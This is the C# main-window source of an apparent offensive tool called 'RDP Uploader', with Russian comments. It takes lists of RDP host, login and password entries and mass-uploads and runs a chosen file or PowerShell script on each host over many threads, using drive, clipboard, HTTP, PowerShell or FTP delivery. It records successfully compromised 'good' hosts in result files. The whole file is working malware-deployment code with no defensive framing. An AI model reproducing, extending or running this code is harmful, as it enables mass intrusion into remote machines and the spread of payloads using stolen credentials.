using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.IO;
using System.Threading;
using System.Threading.Tasks;
using DevExpress.Xpf.Core;
using System.Security.Principal;
using System.Runtime.InteropServices;
using System.Diagnostics;

namespace RDP_Uploader
{
    public partial class MainWindow : DXWindow
    {
        // Конструктор
        public MainWindow()
        {
            // Оптимизация загрузки приложения для работы 
            System.Runtime.ProfileOptimization.SetProfileRoot(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
            System.Runtime.ProfileOptimization.StartProfile("StartProfileRdpUploader");

            // Инициализация компонентов
            InitializeComponent();

            // Запускаем отлов гудов
            Task.Run(() => UploadAddXpRDP());
            Task.Run(() => UploadAddVistaRDP());

            // Запускаем отлов ошибок
            Task.Run(() => UploadErrorRDP());

            // Задаем фокус на вкладке
            UploadTab.Focus();

            // Загружаем настройки
            ReadSettings();
        }

        // Поля
        internal static bool Upload_IsStop = false;
        internal static bool Upload_IsPause = false;
        private static uint Upload_ProgressCounter;
        private static uint Upload_AllIPProgressCounter;
        private static DateTime Upload_Time;
        private static Random rand = new Random();
        private static byte[] FileBytes;
        private static string FileName;
        private static string PowerShellScriptText;

        // Пути
        internal static string Path_Upload_Data_Folder = AppDomain.CurrentDomain.BaseDirectory + @"Data\";
        internal static string Path_Upload_Settings_File = Path_Upload_Data_Folder + @"Settings.txt";
        internal static string Path_Upload_Result_Folder = AppDomain.CurrentDomain.BaseDirectory + @"Check\";
        internal static string Path_Upload_Screenshot_Folder = Path_Upload_Result_Folder + @"Screenshot\";
        internal static string Path_Upload_ScreenshotXp_Folder = Path_Upload_Screenshot_Folder + @"XP-2003\";
        internal static string Path_Upload_ScreenshotVista_Folder = Path_Upload_Screenshot_Folder + @"Vista+\";
        internal static string Path_Upload_ResultXp_File = Path_Upload_Result_Folder + @"GoodRDP (XP-2003).txt";
        internal static string Path_Upload_ResultVista_File = Path_Upload_Result_Folder + @"GoodRDP (Vista+).txt";
        internal static string Path_Upload_Error_File = Path_Upload_Result_Folder + @"ErrorRDP.txt";

        // Коллекции
        internal static BlockingCollection<string> UploadXpCollection = new BlockingCollection<string>();
        internal static BlockingCollection<string> UploadVistaCollection = new BlockingCollection<string>();
        internal static BlockingCollection<string> UploadBadXpCollection = new BlockingCollection<string>();
        internal static BlockingCollection<string> UploadBadVistaCollection = new BlockingCollection<string>();
        internal static BlockingCollection<string> UploadErrorCollection = new BlockingCollection<string>();

        // Проверка путей
        private void CheckPath()
        {
            try
            {
                if (!Directory.Exists(Path_Upload_Data_Folder))
                {
                    try
                    {
                        Directory.CreateDirectory(Path_Upload_Data_Folder);
                    }
                    catch (Exception ex)
                    {
                        MessageBox mbox = new MessageBox("Error create directory: " + Path_Upload_Data_Folder + "!\nError text: " + ex.Message, "Error");
                        mbox.ShowDialog();
                        Environment.Exit(0);
                    }
                }

                if (!File.Exists(Path_Upload_Settings_File))
                {
                    try
                    {
                        File.Create(Path_Upload_Settings_File).Close();
                    }
                    catch (Exception ex)
                    {
                        MessageBox mbox = new MessageBox("Error create directory: " + Path_Upload_Settings_File + "!\nError text: " + ex.Message, "Error");
                        mbox.ShowDialog();
                        Environment.Exit(0);
                    }
                }

                if (!Directory.Exists(Path_Upload_Result_Folder))
                {
                    try
                    {
                        Directory.CreateDirectory(Path_Upload_Result_Folder);
                    }
                    catch (Exception ex)
                    {
                        MessageBox mbox = new MessageBox("Error create directory: " + Path_Upload_Result_Folder + "!\nError text: " + ex.Message, "Error");
                        mbox.ShowDialog();
                        Environment.Exit(0);
                    }
                }

                if (!Directory.Exists(Path_Upload_Screenshot_Folder))
                {
                    try
                    {
                        Directory.CreateDirectory(Path_Upload_Screenshot_Folder);
                    }
                    catch (Exception ex)
                    {
                        MessageBox mbox = new MessageBox("Error create directory: " + Path_Upload_Screenshot_Folder + "!\nError text: " + ex.Message, "Error");
                        mbox.ShowDialog();
                        Environment.Exit(0);
                    }
                }

                if (!Directory.Exists(Path_Upload_ScreenshotXp_Folder))
                {
                    try
                    {
                        Directory.CreateDirectory(Path_Upload_ScreenshotXp_Folder);
                    }
                    catch (Exception ex)
                    {
                        MessageBox mbox = new MessageBox("Error create directory: " + Path_Upload_ScreenshotXp_Folder + "!\nError text: " + ex.Message, "Error");
                        mbox.ShowDialog();
                        Environment.Exit(0);
                    }
                }

                if (!Directory.Exists(Path_Upload_ScreenshotVista_Folder))
                {
                    try
                    {
                        Directory.CreateDirectory(Path_Upload_ScreenshotVista_Folder);
                    }
                    catch (Exception ex)
                    {
                        MessageBox mbox = new MessageBox("Error create directory: " + Path_Upload_ScreenshotVista_Folder + "!\nError text: " + ex.Message, "Error");
                        mbox.ShowDialog();
                        Environment.Exit(0);
                    }
                }

                if (!File.Exists(Path_Upload_ResultXp_File))
                {
                    try
                    {
                        File.Create(Path_Upload_ResultXp_File).Close();
                    }
                    catch (Exception ex)
                    {
                        MessageBox mbox = new MessageBox("Error create directory: " + Path_Upload_ResultXp_File + "!\nError text: " + ex.Message, "Error");
                        mbox.ShowDialog();
                        Environment.Exit(0);
                    }
                }

                if (!File.Exists(Path_Upload_ResultVista_File))
                {
                    try
                    {
                        File.Create(Path_Upload_ResultVista_File).Close();
                    }
                    catch (Exception ex)
                    {
                        MessageBox mbox = new MessageBox("Error create directory: " + Path_Upload_ResultVista_File + "!\nError text: " + ex.Message, "Error");
                        mbox.ShowDialog();
                        Environment.Exit(0);
                    }
                }

                if (!File.Exists(Path_Upload_Error_File))
                {
                    try
                    {
                        File.Create(Path_Upload_Error_File).Close();
                    }
                    catch (Exception ex)
                    {
                        MessageBox mbox = new MessageBox("Ошибка создания файла: " + Path_Upload_Error_File + "!\nError text: " + ex.Message, "Error");
                        mbox.ShowDialog();
                        Environment.Exit(0);
                    }
                }
            }
            catch { }
        }

        // Загружаем настройки
        private void ReadSettings()
        {
            try
            {
                if (File.Exists(Path_Upload_Settings_File))
                {
                    string data = File.ReadAllText(Path_Upload_Settings_File, Encoding.GetEncoding("Windows-1251"));

                    if (!string.IsNullOrWhiteSpace(data))
                    {
                        var dataSource = data.Split('\n');

                        try
                        {
                            textBox_Upload_FTPHost.Text = dataSource[0].Trim();
                            textBox_Upload_FTPPort.Text = dataSource[1].Trim();
                            textBox_Upload_FTPLogin.Text = dataSource[2].Trim();
                            textBox_Upload_FTPPassword.Text = dataSource[3].Trim();
                            textBox_Upload_FTPFilePath.Text = dataSource[4].Trim();
                            textBox_Upload_HTTP_URL.Text = dataSource[5].Trim();
                        }
                        catch { }
                    }
                }
            }
            catch { }
        }

        // Сохраняет API ключ от MaxMind ProxyScore
        private void SaveSettings()
        {
            if (!string.IsNullOrWhiteSpace(textBox_Upload_FTPHost.Text) &&
                !string.IsNullOrWhiteSpace(textBox_Upload_FTPPort.Text) &&
                !string.IsNullOrWhiteSpace(textBox_Upload_FTPLogin.Text) &&
                !string.IsNullOrWhiteSpace(textBox_Upload_FTPPassword.Text) &&
                !string.IsNullOrWhiteSpace(textBox_Upload_FTPFilePath.Text))
            {
                try
                {
                    File.WriteAllText(Path_Upload_Settings_File,
                        textBox_Upload_FTPHost.Text.Trim() + "\r\n" +
                        textBox_Upload_FTPPort.Text.Trim() + "\r\n" +
                        textBox_Upload_FTPLogin.Text.Trim() + "\r\n" +
                        textBox_Upload_FTPPassword.Text.Trim() + "\r\n" +
                        textBox_Upload_FTPFilePath.Text.Trim() + "\r\n" +
                        (!string.IsNullOrWhiteSpace(textBox_Upload_HTTP_URL.Text) ? textBox_Upload_HTTP_URL.Text.Trim() : "")
                        , Encoding.GetEncoding("Windows-1251"));
                }
                catch (Exception ex)
                {
                    MessageBox mbox = new MessageBox("Error save settings!\nError text: " + ex.Message, "Error");
                    mbox.ShowDialog();
                }
            }
        }

        // Событие максимизации формы
        private void DXWindow_SizeChanged(object sender, SizeChangedEventArgs e)
        {
            if (this.WindowState == System.Windows.WindowState.Maximized)
            {
                this.WindowState = System.Windows.WindowState.Normal;
            }
        }

        // Событие закрытия формы
        private void DXWindow_Closing(object sender, System.ComponentModel.CancelEventArgs e)
        {
            // Сохраняем API ключ от MaxMind ProxyScore
            SaveSettings();

            // Завершаем работу приложения
            Environment.Exit(0);
        }

        //////////////////////////////////////////////////////////////////////////
        // RDP Uploader
        //////////////////////////////////////////////////////////////////////////

        // Кнопка "Выбрать файл"
        private async void button_Upload_OpenFile_Click(object sender, RoutedEventArgs e)
        {
            button_Upload_OpenFile.IsEnabled = false;

            try
            {
                // Настраиваем OpenFileDialog
                var dlg = new Microsoft.Win32.OpenFileDialog();
                dlg.InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                dlg.FileName = ""; // Default file name
                dlg.DefaultExt = ""; // Default file extension
                dlg.Filter = ""; // Filter files by extension

                // Показываем диалог
                if (dlg.ShowDialog() == true)
                {
                    // Получаем имя файла
                    FileName = Path.GetFileName(dlg.FileName);

                    await Task.Run(() =>
                    {
                        try
                        {
                            FileBytes = File.ReadAllBytes(dlg.FileName);
                        }
                        catch (Exception ex)
                        {
                            var mbox = new MessageBox("Error opening file: " + dlg.FileName + "!\nError text: " + ex.Message, "Error");
                            mbox.ShowDialog();
                        }
                    });
                }
            }
            catch (Exception ex)
            {
                var mbox = new MessageBox("Error opening file!\nError text: " + ex.Message, "Error");
                mbox.ShowDialog();
            }

            button_Upload_OpenFile.IsEnabled = true;
        }

        // Кнопка "Указать скрипт"
        private async void button_Upload_OpenFile_Power_Shell_Script_Click(object sender, RoutedEventArgs e)
        {
            button_Upload_OpenFile_Power_Shell_Script.IsEnabled = false;

            try
            {
                // Настраиваем OpenFileDialog
                var dlg = new Microsoft.Win32.OpenFileDialog();
                dlg.InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                dlg.FileName = ""; // Default file name
                dlg.DefaultExt = ""; // Default file extension
                dlg.Filter = ""; // Filter files by extension

                // Показываем диалог
                if (dlg.ShowDialog() == true)
                {
                    // Получаем имя файла
                    FileName = Path.GetFileName(dlg.FileName);

                    await Task.Run(() =>
                    {
                        try
                        {
                            PowerShellScriptText = File.ReadAllText(dlg.FileName);
                        }
                        catch (Exception ex)
                        {
                            var mbox = new MessageBox("Error opening file power shell script: " + dlg.FileName + "!\nError text: " + ex.Message, "Error");
                            mbox.ShowDialog();
                        }
                    });
                }
            }
            catch (Exception ex)
            {
                var mbox = new MessageBox("Error opening file power shell script!\nError text: " + ex.Message, "Error");
                mbox.ShowDialog();
            }

            button_Upload_OpenFile_Power_Shell_Script.IsEnabled = true;
        }

        // Кнопка "Старт"
        private async void button_Upload_Start_Click(object sender, RoutedEventArgs e)
        {
            button_Upload_Start.IsEnabled = false;

            // Проверка путей
            CheckPath();

            // Очищаем
            Upload_IsStop = false;
            Upload_IsPause = false;
            button_Upload_Stop.IsEnabled = true;

            // Обновляем статистику
            label_Upload_Count_Accounts.Text = "0";
            label_Upload_Count_Error.Text = "0";
            label_Upload_Count_Good.Text = "0";
            label_Upload_Count_ThisIP.Text = "0";
            label_Upload_Count_LastIP.Text = "0";
            label_Upload_Count_Time.Text = "00:00:00";
            Upload_ProgressCounter = 0;
            Upload_AllIPProgressCounter = 0;
            Upload_ProgressBarText.Text = "0 %";

            // Задаем значения прогрессбара
            Upload_ProgressBar.Minimum = 0;
            Upload_ProgressBar.Maximum = 100;
            Upload_ProgressBar.Value = 0;

            // Объявляем объект синхронизации статистики
            object Upload_Sync_Stat = new object();

            // Задаем стартовое время
            Upload_Time = DateTime.Now;

            // Счетчик потоков
            int ThreadCount = (int)numericUpDown_Upload_ThreadCount.Value;

            // Таймаут
            int Timeout = (int)numericUpDown_Upload_Timeout.Value * 1000;

            // Таймаут загрузки
            int LoadTimeout = (int)numericUpDown_Upload_LoadTimeout.Value * 1000;

            // Таймаут подключения
            int ConnectTimeout = (int)numericUpDown_Upload_ConnectTimeout.Value * 1000;

            // Режим отладки
            bool Debug = (bool)checkBox_Upload_Debug.IsChecked;

            // FTP
            bool UseFTP = (bool)checkBox_Upload_UseFTP.IsChecked;

            // DRIVE
            bool UseDRIVE = (bool)checkBox_Upload_UseDRIVE.IsChecked;

            // CLIPBOARD
            bool UseCLIPBOARD = (bool)checkBox_Upload_UseCLIPBOARD.IsChecked;

            // HTTP PS
            bool UseHTTP_BA = (bool)checkBox_Upload_UseHTTP_BA.IsChecked;

            // HTTP PS
            bool UseHTTP_PS = (bool)checkBox_Upload_UseHTTP_PS.IsChecked;

            // HTTP URL
            string URL = textBox_Upload_HTTP_URL.Text.Trim();

            // FTP хост
            string FTPHost = textBox_Upload_FTPHost.Text.Trim();

            // FTP порт
            string FTPPort = textBox_Upload_FTPPort.Text.Trim();

            // FTP логин
            string FTPLogin = textBox_Upload_FTPLogin.Text.Trim();

            // FTP пароль
            string FTPPassword = textBox_Upload_FTPPassword.Text.Trim();

            // FTP путь к файлу
            string FTPPFilePath = textBox_Upload_FTPFilePath.Text.Trim();

            // Список аккаунтов
            var AccountList = new List<string>();

            // Получаем аккаунты
            if (string.IsNullOrWhiteSpace(richTextBox_Upload_AccountList.Text))
            {
                var mbox = new MessageBox("RDP accounts is empty!", "Notification");
                mbox.ShowDialog();
                button_Upload_Start.IsEnabled = true;
                return;
            }
            else
            {
                foreach (var account in richTextBox_Upload_AccountList.Text.Trim().Split(new string[] { "\n" }, StringSplitOptions.None))
                {
                    string ip = "";
                    string port = "";
                    string login = "";
                    string password = "";
                    string param = "";

                    if (!string.IsNullOrWhiteSpace(account) && !account.Contains(">>>"))
                    {
                        // Парсим аккаунт 
                        string validAccount = Utility.TextUtil.AccountNormalizer(account);

                        if (!string.IsNullOrWhiteSpace(validAccount))
                        {
                            ip = validAccount.Split(';')[0].Trim().Split(':')[0].Trim();
                            port = validAccount.Split(';')[0].Trim().Split(':')[1].Trim();
                            login = validAccount.Split(';')[1].Trim();
                            try
                            {
                                password = Regex.Split(validAccount, "^[^;]+;[^;]+;(.+)$")[1].Trim();
                            }
                            catch { }

                            AccountList.Add(ip + ":" + port + ";" + login + ";" + password);
                        }
                    }
                    else if (account.Contains(">>>"))
                    {
                        // Парсим аккаунт 
                        string validAccount = Utility.TextUtil.AccountNormalizer(account.Split(new string[] { ">>>" }, StringSplitOptions.None)[0].Trim());

                        if (!string.IsNullOrWhiteSpace(validAccount))
                        {
                            ip = validAccount.Split(';')[0].Trim().Split(':')[0].Trim();
                            port = validAccount.Split(';')[0].Trim().Split(':')[1].Trim();
                            login = validAccount.Split(';')[1].Trim();
                            try
                            {
                                password = Regex.Split(validAccount, "^[^;]+;[^;]+;(.+)$")[1].Trim();
                            }
                            catch { }

                            param = account.Split(new string[] { ">>>" }, StringSplitOptions.None)[1].Trim();

                            AccountList.Add(ip + ":" + port + ";" + login + ";" + password + ">>>" + param);
                        }
                    }
                }

                // Убираем дубли
                AccountList = AccountList
                    .Distinct()
                    .ToList();

                // Обновляем статистику
                label_Upload_Count_Accounts.Text = AccountList.Count.ToString();
            }

            // Проверяем выбранные методы
            if (!UseDRIVE && !UseCLIPBOARD && !UseHTTP_BA && !UseHTTP_PS && !UseFTP)
            {
                var mbox = new MessageBox("Not selected method!", "Notification");
                mbox.ShowDialog();
                button_Upload_Start.IsEnabled = true;

                return;
            }
            else if (UseHTTP_PS && PowerShellScriptText == null)
            {
                var mbox = new MessageBox("Not upload script power shell file", "Notification");
                mbox.ShowDialog();
                button_Upload_Start.IsEnabled = true;

                return;
            }
            else
            {
                // Проверка CLIPBOARD и DRIVE
                if (UseDRIVE || UseCLIPBOARD)
                {
                    // Проверяем файл
                    if (FileBytes == null || string.IsNullOrWhiteSpace(FileName))
                    {
                        var mbox = new MessageBox("File not loaded!", "Notification");
                        mbox.ShowDialog();
                        button_Upload_Start.IsEnabled = true;
                        return;
                    }
                }

                // Проверка HTTP
                if (UseHTTP_BA)
                {
                    if (string.IsNullOrWhiteSpace(URL))
                    {
                        var mbox = new MessageBox("URL is empty!", "Notification");
                        mbox.ShowDialog();
                        button_Upload_Start.IsEnabled = true;
                        return;
                    }
                }

                // Проверяем настройки FTP
                if (UseFTP)
                {
                    if (string.IsNullOrWhiteSpace(FTPHost) ||
                        string.IsNullOrWhiteSpace(FTPPort) ||
                        string.IsNullOrWhiteSpace(FTPLogin) ||
                        string.IsNullOrWhiteSpace(FTPPassword) ||
                        string.IsNullOrWhiteSpace(FTPPFilePath))
                    {
                        var mbox = new MessageBox("FTP is empty!", "Notification");
                        mbox.ShowDialog();
                        button_Upload_Start.IsEnabled = true;
                        return;
                    }
                }
            }

            // Получаем счетчик ip адресов для прогрессбара и статистики
            Upload_AllIPProgressCounter = (uint)AccountList.Count;
            label_Upload_Count_LastIP.Text = Upload_AllIPProgressCounter.ToString();

            // Запускаем таймер для обновления прогрессбара
            var timer = new System.Timers.Timer();
            timer.AutoReset = true;
            timer.Enabled = true;
            timer.Elapsed += timer_Upload_Elapsed;
            timer.Interval = 500;
            timer.Start();

            // Запускаем таймер для обновления времени выполнения
            var timerTime = new System.Timers.Timer();
            timerTime.AutoReset = true;
            timerTime.Enabled = true;
            timerTime.Elapsed += timerTime_Upload_Elapsed;
            timerTime.Interval = 500;
            timerTime.Start();

            // Разбиваем подстроки на части
            int count = AccountList.Count();
            var chunkLength = (int)Math.Ceiling(count / (double)ThreadCount);
            var parts = Enumerable.Range(0, ThreadCount).Select(i => AccountList.Skip(i * chunkLength).Take(chunkLength).ToList()).ToList();

            // Создаем массив потоков
            var threads = new Thread[ThreadCount];

            await Task.Run(() =>
            {
                // Начинаем работу
                for (int i = 0; i < threads.Length; i++)
                {
                    if (parts[i] != null)
                    {
                        // Аккаунты
                        var Source = parts[i];

                        threads[i] = new Thread(() =>
                        {
                            // Проходимся по списку аккаунтов
                            foreach (var account in Source)
                            {
                                // Проверка на остановку
                                if (Upload_IsStop)
                                    break;


                                // Проверка на паузу
                                while (Upload_IsPause)
                                    Thread.Sleep(1000);

                                // Парсим аккаунт 
                                string ip = "";
                                int port = 0;
                                string login = "";
                                string password = "";
                                string param = "";

                                if (!string.IsNullOrWhiteSpace(account))
                                {
                                    if (!account.Contains(">>>"))
                                    {
                                        ip = account.Split(';')[0].Trim().Split(':')[0].Trim();
                                        port = int.Parse(account.Split(';')[0].Trim().Split(':')[1].Trim());
                                        login = account.Split(';')[1].Trim();
                                        try
                                        {
                                            password = Regex.Split(account, "[^;]+;[^;]+;(.+)")[1].Trim();

                                        }
                                        catch { }
                                    }
                                    else
                                    {
                                        var tempAcc = account.Split(new string[] { ">>>" }, StringSplitOptions.None)[0];
                                        ip = tempAcc.Split(';')[0].Trim().Split(':')[0].Trim();
                                        port = int.Parse(tempAcc.Split(';')[0].Trim().Split(':')[1].Trim());
                                        login = tempAcc.Split(';')[1].Trim();
                                        try
                                        {
                                            password = Regex.Split(tempAcc, "^[^;]+;[^;]+;(.+)$")[1].Trim();
                                        }
                                        catch { }

                                        param = account.Split(new string[] { ">>>" }, StringSplitOptions.None)[1].Trim();
                                    }
                                }
                                else
                                {
                                    continue;
                                }

                                if (PortScaner.IsOpenPort(ip, port, Timeout))
                                {
                                    // Результат проверки
                                    //var result = PortScaner.GetRdpVersion(ip, port, Timeout).Value;

                                    string powerShell = PowerShellScriptText.Replace("[rdphost]", ip);

                                    // Выполняем загрузку и запуск файла на RDP
                                    SelectMethod(ip, port, login, password, true,
                                         URL, FTPHost, FTPPort, FTPLogin, FTPPassword, FTPPFilePath,
                                         UseDRIVE, UseCLIPBOARD, UseHTTP_BA, UseHTTP_PS, UseFTP,
                                         Timeout, LoadTimeout, ConnectTimeout, param, powerShell, Debug);

                                    UploadVistaCollection.Add(ip + ":" + port.ToString() + ";" + login + ";" + password);

                                    //if (result) { UploadVistaCollection.Add(ip + ":" + port.ToString() + ";" + login + ";" + password); }
                                    //else { UploadXpCollection.Add(ip + ":" + port.ToString() + ";" + login + ";" + password); }
                                }
                                else
                                {
                                    UploadErrorCollection.Add(ip + ":" + port.ToString() + ";" + login + ";" + password);
                                }

                                // Обновляем счетчик прогрессбара
                                lock (Upload_Sync_Stat)
                                    Upload_ProgressCounter++;
                            }
                        }, 4096);

                        threads[i].IsBackground = true;
                        threads[i].Start();
                    }
                }
            });

            // Ожидаем завершение потоков
            await Task.Run(() =>
            {
                foreach (var tread in threads)
                    tread.Join();
            });
            await Task.Delay(1000);

            // Останавливаем таймер
            timer.Stop();
            timerTime.Stop();

            // Обновляем прогрессбар
            Upload_ProgressBarText.Text = "100 %";
            Upload_ProgressBar.Value = Upload_ProgressBar.Maximum;

            // Разблокируем кнопки
            button_Upload_Stop.IsEnabled = true;
            button_Upload_Start.IsEnabled = true;
        }

        // Кнопка "Пауза"
        private void button_Upload_Pause_Click(object sender, RoutedEventArgs e)
        {
            button_Upload_Pause.IsEnabled = false;

            if (!Upload_IsPause)
            {
                Upload_IsPause = true;
                button_Upload_Pause.Content = "На паузе...";
                Upload_Pause_Border.BorderBrush = Brushes.Red;
            }
            else
            {
                Upload_IsPause = false;
                button_Upload_Pause.Content = "Пауза";
                Upload_Pause_Border.BorderBrush = Brushes.Orange;
            }

            button_Upload_Pause.IsEnabled = true;
        }

        // Кнопка "Стоп"
        private void button_Upload_Stop_Click(object sender, RoutedEventArgs e)
        {
            button_Upload_Stop.IsEnabled = false;

            Upload_IsStop = true;
        }

        // Подключение через новый AppDomain
        private bool SelectMethod(string rdpHost, int rdpPort, string rdpLogin, string rdpPassword, bool nla,
            string url, string ftpHost, string ftpPort, string ftpLogin, string ftpPassword, string ftpFilePath,
            bool useDRIVE, bool useCLIPBOARD, bool useHTTP_BA, bool useHTTP_PS, bool useFTP,
            int timeout, int loadTimeout, int connectTimeout, string fileParams, string powerShellScript, bool debug)
        {
            // Результат
            bool result = false;

            // Инициализируем класс настроек
            var param = new RdpUploadClient.RdpParams();
            var flags = RdpUploadClient.RdpParams.SelectedMethod.NONE;

            // Выставляем битовые флаги выбора метода
            if (useDRIVE)
            {
                flags |= RdpUploadClient.RdpParams.SelectedMethod.DRIVE;
            }
            if (useCLIPBOARD)
            {
                flags |= RdpUploadClient.RdpParams.SelectedMethod.CLIPBOARD;
            }
            if (useHTTP_BA)
            {
                flags |= RdpUploadClient.RdpParams.SelectedMethod.HTTP_BA;
            }
            if (useHTTP_PS)
            {
                flags |= RdpUploadClient.RdpParams.SelectedMethod.HTTP_PS;
            }
            if (useFTP)
            {
                flags |= RdpUploadClient.RdpParams.SelectedMethod.FTP;
            }

            // Заполняем настройки
            param.RdpHost = rdpHost;
            param.RdpPort = rdpPort;
            param.RdpLogin = rdpLogin;
            param.RdpPassword = rdpPassword;
            param.NLA = nla;
            param.FileBytes = FileBytes;
            param.FileName = FileName;
            param.URL = url;
            param.FtpHost = ftpHost;
            param.FtpPort = ftpPort;
            param.FtpLogin = ftpLogin;
            param.FtpPassword = ftpPassword;
            param.FtpFilePath = ftpFilePath;
            param.Timeout = timeout;
            param.LoadTimeout = loadTimeout;
            param.ConnectTimeout = connectTimeout;
            param.FileParams = fileParams;
            param.PowerShellScriptText = powerShellScript;
            param.SecureValue1 = NativeWrapper.Dll.SecureValue1;
            param.SecureValue2 = NativeWrapper.Dll.SecureValue2;
            param.SecureValue3 = NativeWrapper.Dll.SecureValue3;
            param.SecureValue4 = NativeWrapper.Dll.SecureValue4;
            param.SecureValue5 = NativeWrapper.Dll.SecureValue5;
            param.SecureValue6 = NativeWrapper.Dll.SecureValue6;
            param.SecureValue7 = NativeWrapper.Dll.SecureValue7;
            param.SecureValue8 = NativeWrapper.Dll.SecureValue8;
            param.Debug = debug;
            param.Method = flags;

            // Проверка имени домена
            var appDomainName = rdpHost.Trim();
            if (string.IsNullOrWhiteSpace(appDomainName))
                appDomainName = rand.Next(100000, 500000).ToString();

            // Добавляем произвольные символы к имени домена
            appDomainName += rand.Next(100, 500).ToString();

            AppDomain domain = null;
            try
            {
                domain = AppDomain.CreateDomain(appDomainName);
                var wrapper = (RdpUploadClient.CaptureProxy)domain.CreateInstanceAndUnwrap("RdpUploadClient", "RdpUploadClient.CaptureProxy");

                if (!wrapper.CallStatic(param).HasFlag(RdpUploadClient.RdpParams.SelectedMethod.FAIL))
                    result = true;
            }
            catch { }
            finally
            {
                try
                {
                    AppDomain.Unload(domain);

                    string DomainNoUnload = domain.FriendlyName;
                    if (!string.IsNullOrWhiteSpace(DomainNoUnload))
                    {
                        Thread.Sleep(5000);
                        AppDomain.Unload(domain);
                    }
                }
                catch { }
            }

            return result;
        }

        // Обновление статистики прогрессбара
        private void timer_Upload_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            this.Dispatcher.Invoke(() =>
            {
                int percent = 0;

                try
                {
                    percent = (int)(Upload_ProgressCounter / (Upload_AllIPProgressCounter / 100M));

                    if (percent > 100)
                        percent = 100;
                }
                catch { }

                Upload_ProgressBarText.Text = percent.ToString() + " %";
                Upload_ProgressBar.Value = percent;
                label_Upload_Count_ThisIP.Text = Upload_ProgressCounter.ToString();
            });
        }

        // Обновление времени выполнения
        private void timerTime_Upload_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            var time = DateTime.Now - Upload_Time;

            // Обновляем время
            this.Dispatcher.Invoke(() => label_Upload_Count_Time.Text = time.Days.ToString("00") + ":" + time.Hours.ToString("00") + ":" + time.Minutes.ToString("00"));
        }

        // Событие перетаскивания файла в поле с логинами
        private void Upload_Accounts_PreviewDragEnter(object sender, DragEventArgs e)
        {
            // Храним результат
            bool isCorrect = true;

            // Задаем фокус
            richTextBox_Upload_AccountList.Focus();

            // Проверка формата файлов
            if (e.Data.GetDataPresent(DataFormats.FileDrop, true))
            {
                string[] filenames = (string[])e.Data.GetData(DataFormats.FileDrop, true);
                foreach (string filename in filenames)
                {
                    if (File.Exists(filename) == false)
                    {
                        isCorrect = false;
                        break;
                    }
                    FileInfo info = new FileInfo(filename);
                    if (info.Extension != ".txt")
                    {
                        isCorrect = false;
                        break;
                    }
                }
            }

            if (isCorrect == true)
            {
                e.Effects = DragDropEffects.All;
            }
            else
            {
                e.Effects = DragDropEffects.None;
            }

            e.Handled = true;
        }

        // Событие перетаскивания файла в поле с логинами
        private async void Upload_Accounts_PreviewDrop(object sender, DragEventArgs e)
        {
            // Очищаем текст
            richTextBox_Upload_AccountList.Text = "";

            this.Cursor = Cursors.Wait;

            await Task.Run(() =>
            {
                StringBuilder text = new StringBuilder();

                // Читаем файл и вводим текст
                string[] filenames = (string[])e.Data.GetData(DataFormats.FileDrop, true);

                foreach (string filename in filenames)
                {
                    // Получаем текст из файла
                    string fileText = File.ReadAllText(filename, Encoding.GetEncoding("Windows-1251"));

                    if (!string.IsNullOrWhiteSpace(fileText))
                        text.Append(fileText.Trim());
                }

                this.Dispatcher.Invoke(() => richTextBox_Upload_AccountList.Text += text.ToString());
            });

            this.Cursor = Cursors.Arrow;

            e.Handled = true;
        }

        // Добавляет хорошие RDP в файл
        private void UploadAddXpRDP()
        {
            foreach (var item in UploadXpCollection.GetConsumingEnumerable())
            {
                if (!string.IsNullOrWhiteSpace(item))
                {
                    // Добавляем строку в файл
                    using (var sw = File.AppendText(Path_Upload_ResultXp_File))
                    {
                        sw.WriteLine(item);
                    }

                    // Обновляем статистику
                    this.Dispatcher.Invoke(() => label_Upload_Count_Good.Text = (int.Parse(label_Upload_Count_Good.Text) + 1).ToString());
                }
            }
        }

        private void UploadAddVistaRDP()
        {
            foreach (var item in UploadVistaCollection.GetConsumingEnumerable())
            {
                if (!string.IsNullOrWhiteSpace(item))
                {
                    // Добавляем строку в файл
                    using (var sw = File.AppendText(Path_Upload_ResultVista_File))
                    {
                        sw.WriteLine(item);
                    }

                    // Обновляем статистику
                    this.Dispatcher.Invoke(() => label_Upload_Count_Good.Text = (int.Parse(label_Upload_Count_Good.Text) + 1).ToString());
                }
            }
        }

        // Добавляет ошибки подключения к порту в файл
        private void UploadErrorRDP()
        {
            foreach (var item in UploadErrorCollection.GetConsumingEnumerable())
            {
                if (!string.IsNullOrWhiteSpace(item))
                {
                    // Добавляем строку в файл
                    using (var sw = File.AppendText(Path_Upload_Error_File))
                    {
                        sw.WriteLine(item);
                    }

                    // Обновляем статистику
                    this.Dispatcher.Invoke(() => label_Upload_Count_Error.Text = (int.Parse(label_Upload_Count_Error.Text) + 1).ToString());
                }
            }
        }

    }
}